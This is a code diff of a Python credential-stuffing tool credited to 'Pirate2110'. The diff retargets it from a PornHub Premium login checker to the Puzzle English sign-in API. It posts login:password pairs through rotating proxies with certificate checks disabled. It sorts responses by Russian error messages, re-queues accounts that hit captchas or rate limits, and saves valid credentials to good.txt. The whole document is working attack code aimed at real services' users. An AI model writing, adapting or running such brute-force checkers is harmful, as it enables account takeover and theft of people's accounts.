@@ -15,8 +15,8 @@ requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 class Brute(object):
     def __init__(self):
-        self.projectName = "PornHub"
-        self.projectFullName = "PornHub Bruteforce and Checker"
+        self.projectName = "PuzzleEnglish"
+        self.projectFullName = "PuzzleEnglish only bruteforce"
         self.description = "Author : Pirate2110"
         self.good = 0
         self.bad = 0 
@@ -36,32 +36,28 @@ class Brute(object):
 
     def check(self, login, password):
         try:
-            
             if self.proxytype != "burp":
                 proxies = {'https': self.proxytype +  "://" +self.getproxy(), 'http': self.proxytype +  "://" + self.getproxy()}
             else:
                 proxies = {'https': '127.0.0.1:8080', 'http': '127.0.0.1:8080'}
-            headers = {'User-Agent' : 'Mozilla/5.0 (Linux; Android 6.0.1; Moto G (4)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Mobile Safari/537.36'}
-            s = requests.session()
-            r = s.get("https://rt.pornhubpremium.com/premium/login", proxies=proxies, verify=False, timeout=self.timeout, headers=headers)
-            site = soup(r.text, "html.parser")
-            token = site.find("input", id="token")
-            body = {'username' : login, 'password': password, 'remember_me' : 'on', 'from':'mobile_login', 'token' : str(token['value']), 'redirect' : '', 'from' : 'pc_premium_login', 'segment':'straight'}
-            r = s.post("https://rt.pornhubpremium.com/front/authenticate", data=body, proxies=proxies, verify=False, timeout=self.timeout, headers=headers)
+            headers = {'User-Agent' : 'Mozilla/5.0 (Linux; Android 6.0.1; Moto G (4)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Mobile Safari/537.36', 'Accept' : 'application/json, text/javascript, */*; q=0.01'}
             
+            body = {'email' : login, 'password': password, 'cookie' : 'language_selected=ru;+tg_movies_gift_6month=12_months;+tg_limit_reached_checkout=old+popup;+tg_chatbot_onboarding=default_onboarding;+tg_landing_brochure_popup=100_phrases;+user_language=ru;+_ga=GA1.2.1852719316.1617157278;+_gid=GA1.2.1536426206.1617157278;+_ym_uid=1617157280411062512;+_ym_d=1617157280;+_ym_isad=1;+_fbp=fb.1.1617157279765.1795761115;+amp_fdb811=pkKpOultbMx8-qt8HkicgN...1f231bk2b.1f231bk2b.0.0.0;+__exponea_etc__=c94e1382-3092-4087-a46c-b38fbabdef0d;+__exponea_time2__=-0.006512165069580078;+_ym_visorc=w;+redirect_to_after_auth=%2F'}
+            r = requests.post("https://puzzle-english.com/api2/user/signin?", data=body, proxies=proxies, verify=False, timeout=self.timeout, headers=headers)
 
-            if "\u041d\u0435\u0432\u0435\u0440\u043d\u043e\u0435" in r.json()['message']:
-                self.bad += 1
-            elif r.json()['success'] == "1":
-                if "https://rt.pornhubpremium.com/premium_signup?type=PhP-Lander" in r.json()['redirect']:
-                    self.writelog("good.txt", login + ":" + password)
-                else:
-                    self.writelog("premium.txt", login + ":" + password + "|" + str(r.text))
-                self.good += 1
-                #return login + ":" + password + "|" + str(r.json()['result']['basic']) + "|" + str(r.json()['result']['bonus'])
+            #print(r.json()['message'])
             
+            if "Слишком много попыток авторизации" in r.json()['message'] or "Введите проверочный код" in r.json()['message']:
+                self.captcha += 1
+                self.lines.append(login+':'+password)
+            elif "Пользователь не существует" in r.json()['message'] or "Неверный пароль" in r.json()['message']:
+                self.bad += 1
+            elif r.json()['error'] == False:
+                self.writelog("good.txt", login + ":" + password)
+                self.good += 1
             else:
                 self.projerror += 1
+                self.writelog("projerr.txt", login + ":" + password + "|" + r.text)
         except Exception as e:
             #print("Error is " + str(e))
             self.error += 1
